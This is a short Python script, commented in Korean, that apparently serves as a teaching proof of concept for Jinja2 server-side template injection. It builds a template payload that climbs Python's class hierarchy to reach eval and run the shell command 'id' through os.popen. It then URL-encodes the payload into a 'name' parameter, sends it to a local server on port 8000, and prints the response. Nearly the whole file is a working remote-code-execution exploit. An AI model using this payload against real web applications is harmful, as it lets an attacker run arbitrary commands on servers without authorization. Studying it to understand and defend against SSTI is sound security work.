from urllib import parse
import requests

script = '__import__("os").popen("id").read()'
# SSTI 취약점 유발 코드
value = """{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('%s') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}"""
value = value.replace("%s", script)

print("<SSTI 취약점 유발 코드>")
print(value)
print()

# SSTI를 수행하는 URL 생성
query = [("name", value)]
url = "http://localhost:8000/?" + parse.urlencode(query)
print("<요청 URL>")
print(url)
print()

# 실제 요청 전송
response = requests.get(url)
print("<서버의 응답>")
print(response.text)
